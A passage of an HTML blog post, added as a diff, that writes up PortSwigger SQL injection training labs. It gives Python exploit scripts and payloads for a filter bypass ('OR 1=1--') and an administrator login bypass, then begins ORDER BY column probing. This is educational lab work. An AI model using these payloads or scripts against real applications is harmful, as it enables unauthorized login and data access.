@@ -1,0 +1,2037 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PortSwigger SQLi Labs 1–14 Write-Up — Vali Hakuryuko</title>
+  <meta name="description" content="Write-ups and Python exploit scripts for the first 14 PortSwigger SQL injection labs — covering WHERE clause bypass, login bypass, UNION attacks, database fingerprinting, blind boolean/error/time-based SQLi." />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=Outfit:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg: #0b0b0d; --surface: #111114; --surface2: #18181c; --border: #222228;
+      --text: #f0ede6; --text2: #8a8794; --text3: #5a5768;
+      --accent: #5dffb2; --accent-dim: #0e2b1f;
+      --accent2: #ff6b6b; --accent2-dim: #200e0e;
+      --accent3: #4a9eff; --accent3-dim: #0e1e2e;
+      --accent4: #f5a623; --accent4-dim: #1e1800;
+      --mono: 'JetBrains Mono', monospace;
+      --sans: 'Outfit', sans-serif;
+      --display: 'Syne', sans-serif;
+      --radius: 8px; --transition: 0.2s ease;
+    }
+    [data-theme="light"] {
+      --bg: #f5f3ef; --surface: #ffffff; --surface2: #eeece8; --border: #ddd9d0;
+      --text: #18161a; --text2: #6b6878; --text3: #aaa8b5; --accent-dim: #d4fce8;
+      --accent2-dim: #ffe0e0; --accent3-dim: #deeeff; --accent4-dim: #fff3dc;
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+    body { background: var(--bg); color: var(--text); font-family: var(--sans); font-weight: 400; line-height: 1.6; transition: background var(--transition), color var(--transition); }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* NAV */
+    nav { position: sticky; top: 0; z-index: 100; background: var(--bg); border-bottom: 1px solid var(--border); padding: 0 2rem; display: flex; align-items: center; justify-content: space-between; height: 60px; backdrop-filter: blur(12px); }
+    .nav-logo { font-family: var(--mono); font-size: 0.85rem; color: var(--accent); text-decoration: none; }
+    .nav-logo span { color: var(--text2); }
+    .nav-links { display: flex; align-items: center; gap: 2rem; list-style: none; }
+    .nav-links a { font-size: 0.875rem; font-weight: 500; color: var(--text2); transition: color var(--transition); text-decoration: none; }
+    .nav-links a:hover { color: var(--text); }
+    .theme-btn { background: var(--surface2); border: 1px solid var(--border); color: var(--text2); cursor: pointer; font-family: var(--mono); font-size: 0.75rem; padding: 0.35rem 0.75rem; border-radius: var(--radius); transition: all var(--transition); }
+    .theme-btn:hover { color: var(--text); border-color: var(--accent); }
+
+    /* LAYOUT */
+    .layout { display: grid; grid-template-columns: 1fr min(780px, 100%) 1fr; padding: 0 2rem; }
+    .layout > * { grid-column: 2; }
+
+    /* POST HEADER */
+    .post-header { padding: 4rem 0 3rem; border-bottom: 1px solid var(--border); margin-bottom: 3rem; }
+    .post-breadcrumb { font-family: var(--mono); font-size: 0.72rem; color: var(--text3); margin-bottom: 1.5rem; }
+    .post-breadcrumb a { color: var(--accent); }
+    .post-meta-row { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1.25rem; flex-wrap: wrap; }
+    .post-date { font-family: var(--mono); font-size: 0.72rem; color: var(--text3); }
+    .post-tag { font-family: var(--mono); font-size: 0.65rem; color: var(--accent); background: var(--accent-dim); border: 1px solid var(--accent); padding: 0.15rem 0.5rem; border-radius: 100px; }
+    .post-read-time { font-family: var(--mono); font-size: 0.72rem; color: var(--text3); }
+    h1.post-title { font-family: var(--display); font-size: clamp(1.8rem, 4vw, 2.8rem); font-weight: 800; letter-spacing: -0.03em; line-height: 1.1; margin-bottom: 1.25rem; }
+    .post-subtitle { font-size: 1.05rem; color: var(--text2); font-weight: 300; line-height: 1.65; }
+
+    /* SERIES PROGRESS BAR */
+    .series-bar { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 1.25rem 1.5rem; margin-bottom: 3rem; }
+    .series-bar-title { font-family: var(--mono); font-size: 0.7rem; color: var(--text3); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 1rem; }
+    .series-pills { display: flex; flex-wrap: wrap; gap: 0.5rem; }
+    .series-pill { font-family: var(--mono); font-size: 0.68rem; padding: 0.3rem 0.7rem; border-radius: var(--radius); border: 1px solid var(--border); color: var(--text3); }
+    .series-pill.done { border-color: var(--accent); color: var(--accent); background: var(--accent-dim); }
+    .series-pill.current { border-color: var(--accent4); color: var(--accent4); background: var(--accent4-dim); }
+
+    /* TOC */
+    .toc { background: var(--surface); border: 1px solid var(--border); border-left: 3px solid var(--accent); border-radius: 0 var(--radius) var(--radius) 0; padding: 1.5rem; margin-bottom: 3rem; }
+    .toc-title { font-family: var(--mono); font-size: 0.72rem; color: var(--accent); text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 1rem; }
+    .toc ol { padding-left: 1.25rem; }
+    .toc li { margin-bottom: 0.4rem; }
+    .toc a { font-size: 0.875rem; color: var(--text2); text-decoration: none; transition: color var(--transition); }
+    .toc a:hover { color: var(--accent); }
+
+    /* ARTICLE */
+    article { margin-bottom: 4rem; }
+
+    /* LAB SECTION */
+    .lab-section { margin-bottom: 5rem; }
+    .lab-header {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 1.75rem 2rem;
+      margin-bottom: 2rem;
+      display: grid;
+      grid-template-columns: auto 1fr;
+      gap: 1.5rem;
+      align-items: start;
+    }
+    .lab-num {
+      font-family: var(--mono);
+      font-size: 0.7rem;
+      font-weight: 700;
+      color: #000;
+      background: var(--accent);
+      width: 40px;
+      height: 40px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+    .lab-header-text {}
+    .lab-title-row { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 0.4rem; flex-wrap: wrap; }
+    .lab-difficulty { font-family: var(--mono); font-size: 0.65rem; padding: 0.2rem 0.55rem; border-radius: 100px; border: 1px solid; }
+    .diff-apprentice { color: #5dffb2; border-color: #5dffb2; background: #0e2b1f; }
+    .diff-practitioner { color: #f5a623; border-color: #f5a623; background: #1e1800; }
+    h2.lab-title { font-family: var(--display); font-size: 1.3rem; font-weight: 700; letter-spacing: -0.02em; }
+    .lab-goal { font-family: var(--mono); font-size: 0.75rem; color: var(--text3); margin-top: 0.4rem; }
+    .lab-goal span { color: var(--accent); }
+
+    h3 {
+      font-family: var(--display);
+      font-size: 1.05rem;
+      font-weight: 700;
+      margin: 2rem 0 0.75rem;
+      color: var(--text);
+    }
+    p { color: var(--text2); font-size: 1rem; line-height: 1.85; margin-bottom: 1.1rem; }
+    p strong { color: var(--text); font-weight: 600; }
+    ul, ol { padding-left: 1.5rem; margin-bottom: 1.1rem; }
+    li { color: var(--text2); font-size: 1rem; line-height: 1.75; margin-bottom: 0.4rem; }
+    li strong { color: var(--text); }
+
+    /* CODE */
+    code { font-family: var(--mono); font-size: 0.875em; background: var(--surface2); border: 1px solid var(--border); padding: 0.15em 0.4em; border-radius: 4px; color: var(--accent); }
+    .code-block { margin: 1.5rem 0; }
+    .code-block-header { display: flex; align-items: center; justify-content: space-between; background: var(--surface2); border: 1px solid var(--border); border-bottom: none; border-radius: var(--radius) var(--radius) 0 0; padding: 0.5rem 1rem; }
+    .code-block-lang { font-family: var(--mono); font-size: 0.65rem; color: var(--text3); text-transform: uppercase; letter-spacing: 0.08em; }
+    .code-block-label { font-family: var(--mono); font-size: 0.65rem; color: var(--text2); }
+    .copy-btn { font-family: var(--mono); font-size: 0.65rem; color: var(--text3); background: none; border: none; cursor: pointer; transition: color var(--transition); padding: 0; }
+    .copy-btn:hover { color: var(--accent); }
+    pre { background: var(--surface); border: 1px solid var(--border); border-radius: 0 0 var(--radius) var(--radius); padding: 1.5rem; overflow-x: auto; margin: 0; }
+    .code-block pre { border-top: none; }
+    pre code { background: none; border: none; padding: 0; color: var(--text); font-size: 0.85rem; line-height: 1.7; }
+
+    /* SYNTAX HIGHLIGHTING */
+    .kw { color: #c792ea; }
+    .fn { color: #82aaff; }
+    .str { color: #c3e88d; }
+    .cmt { color: var(--text3); font-style: italic; }
+    .num { color: #f78c6c; }
+    .cls { color: #ffcb6b; }
+    .op { color: var(--text2); }
+    [data-theme="light"] .kw { color: #7c3aed; }
+    [data-theme="light"] .fn { color: #1d4ed8; }
+    [data-theme="light"] .str { color: #166534; }
+    [data-theme="light"] .cmt { color: #9ca3af; }
+    [data-theme="light"] .num { color: #c2410c; }
+    [data-theme="light"] .cls { color: #92400e; }
+
+    /* CALLOUTS */
+    .callout { border-radius: var(--radius); padding: 1.1rem 1.4rem; margin: 1.5rem 0; border-left: 3px solid; }
+    .callout-title { font-family: var(--mono); font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.4rem; font-weight: 500; }
+    .callout p { margin: 0; font-size: 0.88rem; color: var(--text2); }
+    .callout.info { background: var(--accent3-dim); border-color: var(--accent3); }
+    .callout.info .callout-title { color: var(--accent3); }
+    .callout.warning { background: var(--accent4-dim); border-color: var(--accent4); }
+    .callout.warning .callout-title { color: var(--accent4); }
+    .callout.success { background: var(--accent-dim); border-color: var(--accent); }
+    .callout.success .callout-title { color: var(--accent); }
+    .callout.danger { background: var(--accent2-dim); border-color: var(--accent2); }
+    .callout.danger .callout-title { color: var(--accent2); }
+
+    /* VULN ANATOMY */
+    .vuln-query {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.25rem 1.5rem;
+      margin: 1.25rem 0;
+      font-family: var(--mono);
+      font-size: 0.83rem;
+      line-height: 1.8;
+      overflow-x: auto;
+    }
+    .vuln-query .normal { color: var(--text2); }
+    .vuln-query .injected { color: var(--accent2); text-decoration: underline; text-decoration-style: wavy; }
+    .vuln-query .comment { color: var(--text3); }
+    .vuln-query .label { font-size: 0.65rem; color: var(--text3); display: block; margin-bottom: 0.5rem; text-transform: uppercase; letter-spacing: 0.08em; }
+
+    /* SCRIPT BREAKDOWN TABLE */
+    .breakdown { width: 100%; border-collapse: collapse; margin: 1.25rem 0; font-size: 0.875rem; }
+    .breakdown th { text-align: left; font-family: var(--mono); font-size: 0.65rem; color: var(--text3); text-transform: uppercase; letter-spacing: 0.08em; padding: 0.5rem 1rem; border-bottom: 1px solid var(--border); }
+    .breakdown td { padding: 0.75rem 1rem; border-bottom: 1px solid var(--border); vertical-align: top; }
+    .breakdown td:first-child { font-family: var(--mono); font-size: 0.78rem; color: var(--accent); white-space: nowrap; }
+    .breakdown td:last-child { color: var(--text2); line-height: 1.6; }
+    .breakdown tr:last-child td { border-bottom: none; }
+
+    /* TAKEAWAY BOX */
+    .lab-takeaway {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.5rem;
+      margin-top: 2rem;
+      display: grid;
+      grid-template-columns: auto 1fr;
+      gap: 1rem;
+      align-items: start;
+    }
+    .takeaway-icon { font-size: 1.25rem; }
+    .takeaway-title { font-family: var(--mono); font-size: 0.7rem; color: var(--accent); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 0.4rem; }
+    .takeaway-text { font-size: 0.88rem; color: var(--text2); line-height: 1.6; }
+
+    /* LAB DIVIDER */
+    .lab-divider { border: none; border-top: 1px solid var(--border); margin: 4rem 0; }
+
+    /* CONCLUSION */
+    .conclusion-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin: 1.5rem 0; }
+    .conclusion-card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 1.25rem; }
+    .conclusion-card-title { font-family: var(--mono); font-size: 0.72rem; color: var(--accent); margin-bottom: 0.5rem; }
+    .conclusion-card p { font-size: 0.85rem; color: var(--text2); margin: 0; line-height: 1.55; }
+
+    /* POST FOOTER */
+    hr { border: none; border-top: 1px solid var(--border); margin: 3rem 0; }
+    .post-footer { padding: 3rem 0; border-top: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; gap: 1rem; }
+    .btn { display: inline-flex; align-items: center; gap: 0.5rem; padding: 0.65rem 1.25rem; border-radius: var(--radius); font-size: 0.875rem; font-weight: 500; cursor: pointer; transition: all var(--transition); border: 1px solid var(--border); color: var(--text2); text-decoration: none; }
+    .btn:hover { border-color: var(--text2); color: var(--text); text-decoration: none; }
+    .btn-accent { border-color: var(--accent); color: var(--accent); }
+    .btn-accent:hover { background: var(--accent-dim); }
+    footer { border-top: 1px solid var(--border); padding: 2rem 6vw; display: flex; justify-content: space-between; align-items: center; font-family: var(--mono); font-size: 0.75rem; color: var(--text3); }
+    .footer-back { cursor: pointer; transition: color var(--transition); }
+    .footer-back:hover { color: var(--accent); }
+
+    @media (max-width: 768px) {
+      nav { padding: 0 1.5rem; } .nav-links { display: none; }
+      .layout { grid-template-columns: 1fr; padding: 0 1.5rem; }
+      .post-header { padding: 3rem 0 2rem; }
+      .lab-header { grid-template-columns: 1fr; gap: 1rem; }
+      .conclusion-grid { grid-template-columns: 1fr; }
+      .post-footer { flex-direction: column; align-items: flex-start; }
+      footer { flex-direction: column; gap: 1rem; text-align: center; }
+    }
+  </style>
+</head>
+<body>
+
+  <nav>
+    <a href="../index.html" class="nav-logo"><span>~/</span>vali</a>
+    <ul class="nav-links">
+      <li><a href="../index.html#about">about</a></li>
+      <li><a href="../blog.html">blog</a></li>
+      <li><a href="../projects.html">projects</a></li>
+      <li><a href="../index.html#contact">contact</a></li>
+    </ul>
+    <button class="theme-btn" onclick="toggleTheme()">[ theme ]</button>
+  </nav>
+
+  <div class="layout">
+
+    <header class="post-header">
+      <div class="post-breadcrumb">
+        <a href="../index.html">~</a> / <a href="../blog.html">blog</a> / sqli-labs-1-14
+      </div>
+      <div class="post-meta-row">
+        <span class="post-date">2025-08-01</span>
+        <span class="post-tag">web</span>
+        <span class="post-tag">sqli</span>
+        <span class="post-tag">portswigger</span>
+        <span class="post-read-time">~45 min read</span>
+      </div>
+      <h1 class="post-title">PortSwigger SQLi Labs 1–14<br>Write-Up & Exploit Scripts</h1>
+      <p class="post-subtitle">
+        Working through the PortSwigger Web Security Academy SQL injection track. Each lab gets a manual walkthrough, a Python exploit script, and a breakdown of exactly what the code is doing and why. This post covers Labs 1–14: from basic filter bypass all the way through time-based blind SQLi password extraction.
+      </p>
+    </header>
+
+    <!-- SERIES PROGRESS -->
+    <div class="series-bar">
+      <div class="series-bar-title">// SQLi series progress — 14 of 15 labs</div>
+      <div class="series-pills">
+        <span class="series-pill done">Lab 01</span>
+        <span class="series-pill done">Lab 02</span>
+        <span class="series-pill done">Lab 03</span>
+        <span class="series-pill done">Lab 04</span>
+        <span class="series-pill done">Lab 05</span>
+        <span class="series-pill done">Lab 06</span>
+        <span class="series-pill done">Lab 07</span>
+        <span class="series-pill done">Lab 08</span>
+        <span class="series-pill done">Lab 09</span>
+        <span class="series-pill done">Lab 10</span>
+        <span class="series-pill done">Lab 11</span>
+        <span class="series-pill done">Lab 12</span>
+        <span class="series-pill done">Lab 13</span>
+        <span class="series-pill done">Lab 14</span>
+        <span class="series-pill current">Lab 15 ←</span>
+      </div>
+    </div>
+
+    <!-- TOC -->
+    <div class="toc">
+      <div class="toc-title">// contents</div>
+      <ol>
+        <li><a href="#lab1">Lab 1 — WHERE Clause Filter Bypass</a></li>
+        <li><a href="#lab2">Lab 2 — Login Bypass via SQLi</a></li>
+        <li><a href="#lab3">Lab 3 — UNION: Column Count Enumeration</a></li>
+        <li><a href="#lab4">Lab 4 — UNION: Finding a String Column</a></li>
+        <li><a href="#lab5">Lab 5 — UNION: Retrieving Data from Other Tables</a></li>
+        <li><a href="#lab6">Lab 6 — UNION: Retrieving Multiple Values in One Column</a></li>
+        <li><a href="#lab7">Lab 7 — Querying the Database Type (Oracle)</a></li>
+        <li><a href="#lab8">Lab 8 — Querying the Database Type (MySQL/MSSQL)</a></li>
+        <li><a href="#lab9">Lab 9 — Listing Database Contents (Non-Oracle)</a></li>
+        <li><a href="#lab10">Lab 10 — Listing Database Contents (Oracle)</a></li>
+        <li><a href="#lab11">Lab 11 — Blind SQLi with Conditional Responses</a></li>
+        <li><a href="#lab12">Lab 12 — Blind SQLi with Conditional Errors</a></li>
+        <li><a href="#lab13">Lab 13 — Blind SQLi: Triggering Time Delays</a></li>
+        <li><a href="#lab14">Lab 14 — Blind SQLi: Time-Based Password Extraction</a></li>
+        <li><a href="#recap">Series Recap</a></li>
+      </ol>
+    </div>
+
+    <article>
+
+      <!-- ═══════════════════ LAB 1 ═══════════════════ -->
+      <div class="lab-section" id="lab1">
+        <div class="lab-header">
+          <div class="lab-num">01</div>
+          <div class="lab-header-text">
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-apprentice">Apprentice</span>
+            </div>
+            <h2 class="lab-title">SQL Injection in WHERE Clause — Filter Bypass</h2>
+            <div class="lab-goal">Goal: <span>Make the application display products from all categories, including unreleased ones</span></div>
+          </div>
+        </div>
+
+        <h3>What's happening</h3>
+        <p>
+          SQL injection is possible whenever user-supplied input is concatenated directly into a SQL query string rather than passed as a parameterized argument. When an application builds a query like <code>"SELECT ... WHERE category = '" + userInput + "'"</code>, any SQL syntax inside <code>userInput</code> becomes part of the actual query — not just a string value. This is the root cause of every lab in this series.
+        </p>
+        <p>
+          The product filter page builds its SQL query by directly concatenating the user-supplied <code>category</code> parameter into the query string. There's no sanitization at all. The original query looks something like this:
+        </p>
+        <div class="vuln-query">
+          <span class="label">original query</span>
+          <span class="normal">SELECT * FROM products WHERE category = '</span><span class="normal">Gifts</span><span class="normal">' AND released = 1</span>
+        </div>
+        <p>
+          The <code>released = 1</code> condition is what hides unreleased products. If we can break out of the string and comment out the rest of the WHERE clause, both conditions disappear.
+        </p>
+        <div class="vuln-query">
+          <span class="label">after injection — payload: <code>Gifts'+OR+1=1--</code></span>
+          <span class="normal">SELECT * FROM products WHERE category = '</span><span class="injected">Gifts' OR 1=1</span><span class="comment">--</span><span class="normal">' AND released = 1</span>
+        </div>
+        <p>
+          The single quote closes the category string. <code>OR 1=1</code> makes the condition always true for every row. The <code>--</code> comments out the <code>AND released = 1</code> check entirely. Every product, released or not, is now returned.
+        </p>
+
+        <h3>The script</h3>
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">python</span>
+            <span class="code-block-label">Lab1.py</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code><span class="kw">import</span> requests
+<span class="kw">import</span> sys
+<span class="kw">import</span> urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies <span class="op">=</span> {<span class="str">'http'</span>: <span class="str">'http://127.0.0.1:8080'</span>, <span class="str">'https'</span>: <span class="str">'http://127.0.0.1:8080'</span>}
+
+<span class="kw">def</span> <span class="fn">exploit</span>(url, payload):
+    uri <span class="op">=</span> <span class="str">"/filter?category="</span>
+    r <span class="op">=</span> requests.<span class="fn">get</span>(url <span class="op">+</span> uri <span class="op">+</span> payload, verify<span class="op">=</span><span class="kw">False</span>, proxies<span class="op">=</span>proxies)
+    <span class="kw">if</span> <span class="str">"Fur Babies"</span> <span class="kw">in</span> r.text:
+        <span class="kw">return</span> <span class="kw">True</span>
+    <span class="kw">else</span>:
+        <span class="kw">return</span> <span class="kw">False</span>
+
+<span class="kw">if</span> __name__ <span class="op">==</span> <span class="str">"__main__"</span>:
+    <span class="kw">try</span>:
+        url <span class="op">=</span> sys.argv[<span class="num">1</span>].strip()
+        payload <span class="op">=</span> sys.argv[<span class="num">2</span>].strip()
+    <span class="kw">except</span> <span class="cls">IndexError</span>:
+        <span class="fn">print</span>(<span class="str">"Enter the command properly"</span>)
+        sys.<span class="fn">exit</span>(<span class="op">-</span><span class="num">1</span>)
+
+    <span class="kw">if</span> <span class="fn">exploit</span>(url, payload):
+        <span class="fn">print</span>(<span class="str">"[+] SQLi Successfully done"</span>)
+    <span class="kw">else</span>:
+        <span class="fn">print</span>(<span class="str">"[-] SQLi Failed"</span>)</code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">bash</span>
+            <span class="code-block-label">usage</span>
+          </div>
+          <pre><code>python Lab1.py https://&lt;lab-id&gt;.web-security-academy.net "'+OR+1=1--"</code></pre>
+        </div>
+
+        <h3>Script breakdown</h3>
+        <table class="breakdown">
+          <tr><th>line / concept</th><th>what it does and why</th></tr>
+          <tr>
+            <td>urllib3.disable_warnings</td>
+            <td>PortSwigger labs use self-signed TLS certs. Without this, requests throws a warning on every call. Just noise suppression.</td>
+          </tr>
+          <tr>
+            <td>proxies dict</td>
+            <td>Routes all traffic through Burp Suite on port 8080 so you can see exactly what the script is sending and receiving. Essential for debugging.</td>
+          </tr>
+          <tr>
+            <td>verify=False</td>
+            <td>Disables TLS certificate verification — required for the self-signed lab cert. Never use this against real production targets.</td>
+          </tr>
+          <tr>
+            <td>"Fur Babies" in r.text</td>
+            <td>The success condition. "Fur Babies" is an unreleased product — if it shows up in the response, our filter bypass worked and unreleased products are now visible. This string changes per-lab; always inspect the response first to pick a reliable marker.</td>
+          </tr>
+          <tr>
+            <td>sys.argv[1], sys.argv[2]</td>
+            <td>URL and payload passed as command-line arguments. Keeps the script flexible — you can try different payloads without modifying the code.</td>
+          </tr>
+        </table>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">🧠</div>
+          <div>
+            <div class="takeaway-title">What this lab teaches</div>
+            <div class="takeaway-text">When user input is concatenated directly into a SQL query with no parameterization, a single quote can break out of the intended string context. From there, you control the query logic. The <code>--</code> comment terminator is your tool for removing unwanted conditions that follow your injection point.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider" />
+
+      <!-- ═══════════════════ LAB 2 ═══════════════════ -->
+      <div class="lab-section" id="lab2">
+        <div class="lab-header">
+          <div class="lab-num">02</div>
+          <div class="lab-header-text">
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-apprentice">Apprentice</span>
+            </div>
+            <h2 class="lab-title">SQL Injection — Login Bypass</h2>
+            <div class="lab-goal">Goal: <span>Log in as <code>administrator</code> without knowing the password</span></div>
+          </div>
+        </div>
+
+        <h3>What's happening</h3>
+        <p>
+          The login form passes username and password directly into a SQL query. The backend likely runs something like:
+        </p>
+        <div class="vuln-query">
+          <span class="label">original query</span>
+          <span class="normal">SELECT * FROM users WHERE username = '</span><span class="normal">wiener</span><span class="normal">' AND password = '</span><span class="normal">peter</span><span class="normal">'</span>
+        </div>
+        <p>
+          Both conditions must be true to authenticate. By injecting into the username field, we can comment out the password check entirely:
+        </p>
+        <div class="vuln-query">
+          <span class="label">after injection — username: <code>administrator'--</code></span>
+          <span class="normal">SELECT * FROM users WHERE username = '</span><span class="injected">administrator'</span><span class="comment">--</span><span class="normal">' AND password = 'randomtext'</span>
+        </div>
+        <p>
+          The query now only checks for a user with the username <code>administrator</code>. The password check is commented out. If that user exists, we're logged in.
+        </p>
+
+        <div class="callout info">
+          <div class="callout-title">ℹ️ CSRF Token</div>
+          <p>This lab's login form includes a CSRF token — a hidden field that must match a server-side value or the form submission is rejected. CSRF tokens protect against cross-site request forgery: an attacker on another domain can't forge a valid form submission because they can't read the token from the page. But they do nothing against SQL injection — you just need to be a legitimate browser visiting the page and collecting the token. The script does exactly this: fetch the login page with a session, extract the token, then fire the injected POST with the same session.</p>
+        </div>
+
+        <h3>The script</h3>
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">python</span>
+            <span class="code-block-label">Lab2.py</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code><span class="cmt"># python Lab2.py https://&lt;lab-id&gt;.web-security-academy.net/login "administrator'--"</span>
+<span class="kw">import</span> requests
+<span class="kw">import</span> sys
+<span class="kw">import</span> urllib3
+<span class="kw">from</span> bs4 <span class="kw">import</span> BeautifulSoup
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies <span class="op">=</span> {<span class="str">'http'</span>: <span class="str">'http://127.0.0.1:8080'</span>, <span class="str">'https'</span>: <span class="str">'http://127.0.0.1:8080'</span>}
+
+<span class="kw">def</span> <span class="fn">get_csrf_token</span>(s, url):
+    r <span class="op">=</span> s.<span class="fn">get</span>(url, verify<span class="op">=</span><span class="kw">False</span>, proxies<span class="op">=</span>proxies)
+    soup <span class="op">=</span> <span class="cls">BeautifulSoup</span>(r.text, <span class="str">'html.parser'</span>)
+    csrf <span class="op">=</span> soup.<span class="fn">find</span>(<span class="str">"input"</span>)[<span class="str">'value'</span>]
+    <span class="kw">return</span> csrf
+
+<span class="kw">def</span> <span class="fn">exploit_sqli</span>(s, url, payload):
+    csrf <span class="op">=</span> <span class="fn">get_csrf_token</span>(s, url)
+    data <span class="op">=</span> {<span class="str">"csrf"</span>: csrf,
+            <span class="str">"username"</span>: payload,
+            <span class="str">"password"</span>: <span class="str">"randomtext"</span>}
+    r <span class="op">=</span> s.<span class="fn">post</span>(url, data<span class="op">=</span>data, verify<span class="op">=</span><span class="kw">False</span>, proxies<span class="op">=</span>proxies)
+    <span class="kw">if</span> <span class="str">"Log out"</span> <span class="kw">in</span> r.text:
+        <span class="kw">return</span> <span class="kw">True</span>
+    <span class="kw">else</span>:
+        <span class="kw">return</span> <span class="kw">False</span>
+
+<span class="kw">if</span> __name__ <span class="op">==</span> <span class="str">"__main__"</span>:
+    <span class="kw">try</span>:
+        url <span class="op">=</span> sys.argv[<span class="num">1</span>].strip()
+        sqli_payload <span class="op">=</span> sys.argv[<span class="num">2</span>].strip()
+    <span class="kw">except</span> <span class="cls">IndexError</span>:
+        <span class="fn">print</span>(<span class="str">"Enter url command properly"</span>)
+        sys.<span class="fn">exit</span>(<span class="op">-</span><span class="num">1</span>)
+
+    s <span class="op">=</span> requests.<span class="cls">Session</span>()
+    <span class="kw">if</span> <span class="fn">exploit_sqli</span>(s, url, sqli_payload):
+        <span class="fn">print</span>(<span class="str">'[+] SQL injection successful! Logged in as administrator.'</span>)
+    <span class="kw">else</span>:
+        <span class="fn">print</span>(<span class="str">'[-] SQL injection unsuccessful.'</span>)</code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">bash</span>
+            <span class="code-block-label">usage</span>
+          </div>
+          <pre><code>python Lab2.py https://&lt;lab-id&gt;.web-security-academy.net/login "administrator'--"</code></pre>
+        </div>
+
+        <h3>Script breakdown</h3>
+        <table class="breakdown">
+          <tr><th>line / concept</th><th>what it does and why</th></tr>
+          <tr>
+            <td>requests.Session()</td>
+            <td>Creates a persistent session object that carries cookies across requests. This is critical — the CSRF token from the GET request is tied to a session cookie. If you use a plain <code>requests.get</code> followed by a separate <code>requests.post</code>, you get two different sessions and the CSRF check fails.</td>
+          </tr>
+          <tr>
+            <td>get_csrf_token()</td>
+            <td>GETs the login page and uses BeautifulSoup to parse the HTML and extract the value of the first <code>&lt;input&gt;</code> element — that's where the CSRF token lives as a hidden field.</td>
+          </tr>
+          <tr>
+            <td>soup.find("input")['value']</td>
+            <td>A slightly fragile selector — it grabs the first input in the page which happens to be the CSRF field. A more robust version would use <code>soup.find("input", {"name": "csrf"})</code> to target it by name explicitly.</td>
+          </tr>
+          <tr>
+            <td>password: "randomtext"</td>
+            <td>Doesn't matter what value this is — the injection in the username field comments out the password check entirely before the server ever evaluates it.</td>
+          </tr>
+          <tr>
+            <td>"Log out" in r.text</td>
+            <td>If we're logged in, the response will contain a logout link. That's our success indicator — cleaner than checking for a specific page title that might vary.</td>
+          </tr>
+        </table>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">🧠</div>
+          <div>
+            <div class="takeaway-title">What this lab teaches</div>
+            <div class="takeaway-text">Authentication logic that relies entirely on the database query to validate credentials is fundamentally broken if the query can be manipulated. It also introduces a key real-world concept: <strong>CSRF tokens don't protect against SQLi</strong> — they prevent cross-site request forgery, not injection. You just need to collect the valid CSRF token as part of your attack flow.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider" />
+
+      <!-- ═══════════════════ LAB 3 ═══════════════════ -->
+      <div class="lab-section" id="lab3">
+        <div class="lab-header">
+          <div class="lab-num">03</div>
+          <div class="lab-header-text">
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-practitioner">Practitioner</span>
+            </div>
+            <h2 class="lab-title">UNION Attack — Determining the Number of Columns</h2>
+            <div class="lab-goal">Goal: <span>Find out how many columns the original query returns using ORDER BY or UNION NULL probing</span></div>
+          </div>
+        </div>
+
+        <h3>Why column count matters</h3>
+        <p>
+          UNION-based SQLi lets you append a second <code>SELECT</code> statement to the original query and have its results returned in the response. But for UNION to work, <strong>your injected SELECT must return the exact same number of columns as the original query</strong>. Too few or too many columns = Internal Server Error. Additionally, the column types need to be compatible — which is why we later use NULL placeholders (NULL is type-agnostic in SQL).
+        </p>
+        <p>
+          Step one of any UNION attack is therefore figuring out how many columns exist. There are two main methods: <code>ORDER BY</code> probing (incrementing until an error fires) or <code>UNION NULL</code> probing (adding NULLs until the query succeeds). ORDER BY is cleaner because it requires only one loop instead of trying every column count combination.
+        </p>
+        <div class="vuln-query">
+          <span class="label">probing with ORDER BY</span>
+          <span class="normal">SELECT ... WHERE category='Gifts'</span><span class="injected">'+ORDER+BY+1--</span>  ← works
+          <br/>
+          <span class="normal">SELECT ... WHERE category='Gifts'</span><span class="injected">'+ORDER+BY+2--</span>  ← works
+          <br/>
